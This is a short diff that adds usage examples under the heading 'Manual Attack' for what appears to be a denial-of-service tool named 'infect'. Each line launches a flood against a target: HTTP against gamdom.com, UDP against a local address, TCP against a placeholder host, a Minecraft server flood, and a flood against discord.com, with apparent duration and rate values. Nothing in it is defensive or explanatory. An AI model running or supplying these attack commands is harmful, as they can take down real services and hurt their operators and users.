@@ -1,0 +1,7 @@
+-------Manual Attack---------
+
+./infect manual http https://gamdom.com/ 300 2500
+./infect manual udp 192.168.1.1 80 120 1000
+./infect manual tcp target.com 443 60 300
+./infect manual game mc.server.com 25565 300 200 minecraft
+./infect manual discord https://discord.com 60 100
